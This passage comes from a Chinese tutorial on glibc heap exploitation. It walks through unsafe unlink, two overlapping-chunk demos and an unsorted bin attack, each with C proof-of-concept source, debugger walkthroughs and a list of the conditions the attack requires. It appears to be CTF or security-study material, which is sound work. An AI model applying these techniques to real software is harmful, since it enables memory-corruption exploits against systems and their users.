<p>可以看到此时chunk1的pre_size域已经被设为了0x80，这也就意味着系统向前找chunk的时候会向前0x80找到我们的fake_chunk，但是这还不够，我们需要伪造chunk0是free态的chunk，只需要把标志位设为0就好了，也就是执行到下面一步</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509636936/0" alt="image-20210510172451277"></p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509637692/0" alt="image-20210510172501037"></p>
<p>可以看到此时我们的chunk1的pre_inuse已经被设为0了</p>
<p>此时我们free chunk1，这是就会发生unlink</p>
<p>这里就触发了free的向后合并，也就是向物理相邻低地址合并从而调用unlink函数，此时的堆结构</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509757035/0" alt="image-20210510174518847"></p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13509770504/0" alt="image-20210510174729789"></p>
<p>可以看到此时本来存放chunk0地址的地方变成的&amp;chunk0_ptr-0x18，即本来0x602078存放的是chunk0_ptr也就是0x603010的地址，此时被修改成了0x602060，也就是chunk中包含了指向chunk的指针，并且我们可以覆写它，也就达到了任意地址读写</p>
<p>后面的赋值感觉没什么可以说的，前面的就是相当于直接修改了存放chunk指针的区域，导致劫持了chunk指针，从而能够达到任意读写的作用</p>
<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>依旧,程序先是弄了一个全局变量chunk0_ptr,紧接着给他申请了0x80实际上是0x90的内存空间</p>
<p>之后新建了一个大小一样的chunk1_ptr</p>
<p>这时我们要确定的是我们的全局指针是chunk0_ptr,要攻击的chunk是chunk1_ptr</p>
<p>之后程序构造了P-&gt;FD-&gt;BK=P和P-&gt;BK-&gt;FD=P的条件,想要伪造一个fake_chunk</p>
<p>假设我们拥有溢出的能力,修改chunk1_ptr的pre_size域让系统认为我们的上一个chunk是我们伪造的fake chunk,并且将chunk1_ptr的size域标志位置0以伪造其被free的假象</p>
<p>然后程序free掉了chunk1触发了free的后向合并从而调用了unlink函数,此时我们的攻击就算结束了</p>
<p>而程序的攻击效果就是将本来是P处的指针变为了P-0x18的指针,我们就拥有了任意内存读写的能力,over~</p>
<p>这里我们列出一下我们利用所需要的的一些条件：</p>
<ol>
<li>两个相邻chunk，一个chunk存放伪造的chunk</li>
<li>伪造的chunk中fd=存放伪造chunk的地址-0x18，伪造的chunk中bk=存放伪造chunk的地址-0x10</li>
<li>下一个chunk的pre_inuse位为0，且pre_size要刚好到伪造的chunk，即要收缩chunk</li>
<li>释放那个没有包含伪造chunk的chunk</li>
</ol>
<h1 id="0x06-overlapping-chunks"><a href="#0x06-overlapping-chunks" class="headerlink" title="0x06 overlapping_chunks"></a>0x06 overlapping_chunks</h1><p>overlapping在平常是非常常用的技巧</p>
<h2 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="comment">// p2现在在unsorted bin中，时刻准备为新的malloc服务</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在模拟一下溢出来覆写p2的size</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 对实例程序而言,最后三个字节是什么并不重要,然而,我们最好还是维持一下堆的稳定性	</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">		<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 为了维持堆的稳定性，我门还是要把pre_inuse标志位设为1来确保我们的p1不会被错误的认为是一个free chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">		<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们分配一个和p2被注入的size一样的大小的chunk</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 这次的malloc将会从我们刚刚修改过size的unsorted bin中取出free chunk</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们写进p4的内容就可以覆盖p3啦，同时，我们写进p3里的内容也可以修改p4的内容</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-4"><a href="#运行结果及调试-4" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>我们断在申请三个chunk p1，p2，p3后，看看此时的堆块</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510369556/0" alt="image-20210510195421233"></p>
<p>然后给三个chunk赋初值</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510377494/0" alt="image-20210510195646045"></p>
<p>此时我们走到free掉p2，此时我们的p2被放进了unsorted bin中</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510382891/0" alt="image-20210510195820989"></p>
<p>接着我们假设我们溢出了chunk1，成功修改了chunk2的size为0x181</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510391587/0" alt="image-20210510200053341"></p>
<p>可以看到此时我们的chunk的size从0x101修改成了0x181，此时我们malloc p4将释放的chunk申请回来，此时p4就将整个p3都包含进去，在题目中我们可以切割p4，来将main_arena的地址放入到p3中，因为p3是没有释放的，我们可以利用p3来泄露地址等等。</p>
<h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>程序先是malloc了2个0x100大小的chunk,p1,p2,和一个大小为0x80的chunk,p3</p>
<p>紧接着,程序初始化了三个chunk,里面的值分别为1,2,3</p>
<p>之后程序free掉了p2,并假设拥有溢出的能力,通过溢出p1修改了p2的size域</p>
<p>此时p2的size是0x181,系统会认为我们有一个大小为0x180的在unsorted bin中的fake chunk</p>
<p>紧接着,我们再申请了一个大小为0x180的chunk p4,这样系统就会把我们unsorted bin中的free chunk也就是我们构造好的大小为0x180的fake chunk拿出来给p4</p>
<p>此时p4的后0x80的空间就和p3共享了,这就构成了overlapping_chunk! 堆重叠</p>
<p>这里依旧列出我们利用所需要的一些条件：</p>
<ol>
<li>某个chunk的size被修改，通过溢出或者某种手段，将它后面的，也就是高地址的chunk包含进去，或者包含一部分</li>
<li>这个被修改size的chunk要先free掉，该了size之后，在申请回来，一般是先将它放到unsorted bin，其他bin都是有size检查的</li>
</ol>
<h1 id="0x07-overlapping-chunks-2"><a href="#0x07-overlapping-chunks-2" class="headerlink" title="0x07 overlapping_chunks_2"></a>0x07 overlapping_chunks_2</h1><h2 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个也被称为不相邻的free chunk conslidation 攻击</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// malloc_usable_size函数可以获取chunk实际分配的内存大小  </span></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 为了方便看攻击效果，所以5个chunk分别为A,B,C,D,E  </span></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 现在我们free一下p4，在有p5邻接top chunk的情况下，我们释放p4不会引起p4与top chunk合并</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在我们通过溢出chunk p1将chunk p2的size改为p2+p3的大小并且将标注为设为正在使用来触发漏洞 </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在我们再free p2，这个时候ptmalloc就会认为下一个chunk是p4(p2的size已经被我们改为p2+p3了)</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这样就会创建一个大的错误包含p3的free chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="comment">// 现在我们再创建一个新的大小正好是我们创建的fake free chunk的新chunk </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-5"><a href="#运行结果及调试-5" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是看下申请完所有chunk的堆块，malloc5个0x3e8大小的chunk</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510640149/0" alt="image-20210510210804170"></p>
<p>此时我们free掉chunk4</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510705641/0" alt="image-20210510212807142"></p>
<p>此时我们修改chuk2的size域为0x7e1</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510711611/0" alt="image-20210510213016267"></p>
<p>此时我们再申请p6</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13510741490/0" alt="image-20210510213904156"></p>
<p>那么此时的p3已经包含再p6中了</p>
<h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><p>好了,程序首先malloc了5块大小为1008的chunk,p1,p2,p3,p4,p5</p>
<p>紧接着,程序free掉了p4,因为还有p5 紧邻着top chunk,因此p4并不会被合并到topchunk中</p>
<p><strong>这里要注意,在本例中,是否free p4的效果是一样的</strong></p>
<p>之后呢,为便于直观的看一下效果,将chunk按次序填满了A,B,C,D,E</p>
<p>紧接着,程序修改了chunk p2的size域大小为p2+p3,然后free掉了chunk p2</p>
<p>这个时候,系统会错误的把p2和p3合并的大chunk放进unsorted bin中并与我们的free chunk p4合并</p>
<p>然后申请了p2+p3大小的新chunk p6(所以我说其实不用free p4的…甚至都不用malloc p5 2333</p>
<p>此时p6的后半部分也就是p3大小的部分就与之前未free的p3重叠了:)</p>
<p>这里也做一下overlapping_chunks和overlapping_chunks_2的比较</p>
<p>overlapping_chunks中,程序更改了已经释放掉的chunk的size域而2则是修改了还未释放的chunk的size域,但是效果都是一样的,都是构造了一个重叠块 (overlapping chunk!</p>
<h1 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h1><p>unsorted bin attack的杀伤力虽然不够，但是也是不可小视的辅助攻击方式</p>
<p>在_int_malloc中有这么一段，他会在unsorted bin取出时被调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>这个bck是什么呢</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim -&gt; bk</span><br></pre></td></tr></table></figure>
<p>因此我们只需要控制bk指针就可以让bck位置可控，而我们的bck-fd也就可控的，此时就可以往任意地址写一个东西，但是写的东西归我们控制，因此只能打辅助</p>
<h2 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h2><p>本demo使用unsorted bin attack技巧将一个很大的无符号long型值写进了栈里</p>
<p>在实际中,unsorted bin attack常常用于为其他的攻击做辅助,比如覆写global_max_fast来为fastbin attack做辅助</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// stack_var就是我们的攻击目标</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="comment">// 我们先在堆上分配一个正常的chunk</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">    <span class="comment">// 现在我们释放的p将会被放入unsorted bin中，并且其bk指向p[1]</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">    <span class="comment">// 现在我们模拟有一个漏洞让我们可以覆写victim-bk指针</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="comment">// 现在我们再分配一次来取回我们刚刚free掉的chunk，此时攻击目标已经被改写了</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-6"><a href="#运行结果及调试-6" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是先看下分配完的堆块结构</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513335246/0" alt="image-20210511162319659"></p>
<p>然后将我们的p放入unsorted bin中</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513338605/0" alt="image-20210511162411174"></p>
<p>然后给我们的p[1]赋值，也就是给我们p的bk赋值</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513343261/0" alt="image-20210511162515662"></p>
<p>可以看到我们的bk指针已经被修改为了&amp;stack_var-2，此时取出我们的unsorted bin中的chunk</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513355599/0" alt="image-20210511162741872"></p>
<p>可以看到此时我们的stack_var已经写成了unsortedbin(av)的值，其实就是把bk处也就是<code>0x7fffffffde08</code>当成chunk，并在它的bk位置写入一个值。</p>
<h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>程序首先定义了一个变量stack_var,紧接着malloc了两个chunk</p>
<p>之后Free掉了第一块chunk,并修改p-&gt;bk=&amp;stack_var,这个时候再malloc出来</p>
<p>然后我们的变量值就被改成了unsorted bin(av)的地址</p>
<p>在正常使用中,因为unsorted bin写入的值并非可控值,因此只是起到一个辅助的作用</p>
<p>依旧是列条件：</p>
<ol>
